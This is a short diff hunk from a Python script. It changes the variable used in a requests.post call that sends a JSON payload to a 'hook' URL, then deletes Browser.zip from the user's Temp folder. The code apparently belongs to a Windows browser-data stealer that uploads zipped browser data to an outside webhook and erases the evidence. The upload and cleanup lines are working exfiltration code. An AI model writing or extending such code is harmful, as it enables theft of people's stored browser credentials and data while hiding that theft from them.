@@ -255,7 +255,7 @@ def mainpass():
         }
     ]
     }
-    r = requests.post(hookTy, json=todo)
+    r = requests.post(hook, json=todo)
                 
     try:
         os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
